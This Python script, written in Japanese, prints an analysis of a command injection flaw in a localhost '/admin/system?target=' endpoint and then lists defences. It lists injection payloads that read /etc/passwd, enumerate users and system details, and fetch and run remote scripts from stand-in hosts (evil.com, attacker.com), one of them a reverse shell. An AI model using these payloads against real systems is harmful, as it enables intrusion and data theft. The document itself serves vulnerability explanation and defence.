#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
/admin/system?target= コマンドインジェクション脆弱性分析
"""

import urllib.parse

def analyze_command_injection():
    print("🚨 コマンドインジェクション脆弱性分析")
    print("=" * 60)
    
    base_url = "http://localhost:5000/admin/system?target="
    
    print("\n📋 脆弱性の詳細:")
    print("-" * 40)
    print("・エンドポイント: /admin/system")
    print("・パラメーター: target")
    print("・脆弱性: コマンドインジェクション")
    print("・危険度: 🔴 Critical")
    print("・影響: RCE (Remote Code Execution)")
    
    print("\n💥 攻撃ペイロード例:")
    print("=" * 50)
    
    # Windows環境での攻撃ペイロード
    windows_payloads = [
        "127.0.0.1 & dir",
        "127.0.0.1 & whoami",
        "127.0.0.1 & type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "127.0.0.1 & net user",
        "127.0.0.1 & systeminfo",
        "127.0.0.1 & powershell -c Get-Process",
        "127.0.0.1 & echo %USERNAME%",
        "127.0.0.1 && calc.exe",
        "127.0.0.1; dir C:\\",
        "127.0.0.1 | dir"
    ]
    
    print("\n🪟 Windows環境での攻撃:")
    for i, payload in enumerate(windows_payloads, 1):
        encoded = urllib.parse.quote(payload)
        print(f"{i:2d}. {payload}")
        print(f"    URL: {base_url}{encoded}")
        print(f"    効果: {get_attack_effect(payload)}")
        print()
    
    # Linux/macOS環境での攻撃ペイロード  
    unix_payloads = [
        "127.0.0.1; ls -la",
        "127.0.0.1 && whoami",
        "127.0.0.1 & cat /etc/passwd",
        "127.0.0.1; id",
        "127.0.0.1 && uname -a",
        "127.0.0.1; ps aux",
        "127.0.0.1 | ls /",
        "127.0.0.1; cat /proc/version"
    ]
    
    print("\n🐧 Linux/macOS環境での攻撃:")
    for i, payload in enumerate(unix_payloads, 1):
        encoded = urllib.parse.quote(payload)
        print(f"{i:2d}. {payload}")
        print(f"    URL: {base_url}{encoded}")
        print(f"    効果: {get_unix_attack_effect(payload)}")
        print()
    
    print("\n🔥 高度な攻撃例:")
    print("=" * 50)
    advanced_payloads = [
        "127.0.0.1; python -c \"import os;os.system('calc')\"",
        "127.0.0.1 && powershell -c \"Invoke-WebRequest -Uri http://evil.com/shell.ps1 | iex\"",
        "127.0.0.1; curl http://attacker.com/reverse_shell.sh | bash",
        "127.0.0.1 & certutil -urlcache -split -f http://evil.com/payload.exe payload.exe"
    ]
    
    for i, payload in enumerate(advanced_payloads, 1):
        print(f"{i}. {payload}")
        print(f"   危険度: 🔴🔴🔴 極めて危険")
        print()
    
    print("\n🛡️ 対策:")
    print("=" * 50)
    print("1. ✅ 入力値の厳格な検証 (IPアドレス形式チェック)")
    print("2. ✅ subprocess.run() でshell=Falseを使用")
    print("3. ✅ ホワイトリスト方式の入力制限")
    print("4. ✅ 正規表現による入力値検証")
    print("5. ✅ shlex.quote() による適切なエスケープ")

def get_attack_effect(payload):
    if "dir" in payload:
        return "ディレクトリ一覧表示"
    elif "whoami" in payload:
        return "現在のユーザー名表示"
    elif "systeminfo" in payload:
        return "システム情報取得"
    elif "net user" in payload:
        return "ユーザーアカウント一覧"
    elif "calc" in payload:
        return "電卓アプリ起動"
    elif "powershell" in payload:
        return "PowerShell実行"
    elif "type" in payload:
        return "ファイル内容表示"
    else:
        return "任意コマンド実行"

def get_unix_attack_effect(payload):
    if "ls" in payload:
        return "ディレクトリ一覧表示"
    elif "whoami" in payload or "id" in payload:
        return "現在のユーザー情報表示"
    elif "cat /etc/passwd" in payload:
        return "ユーザーアカウント情報取得"
    elif "uname" in payload:
        return "システム情報取得"
    elif "ps" in payload:
        return "プロセス一覧表示"
    elif "cat /proc/version" in payload:
        return "カーネル情報取得"
    else:
        return "任意コマンド実行"

if __name__ == "__main__":
    analyze_command_injection()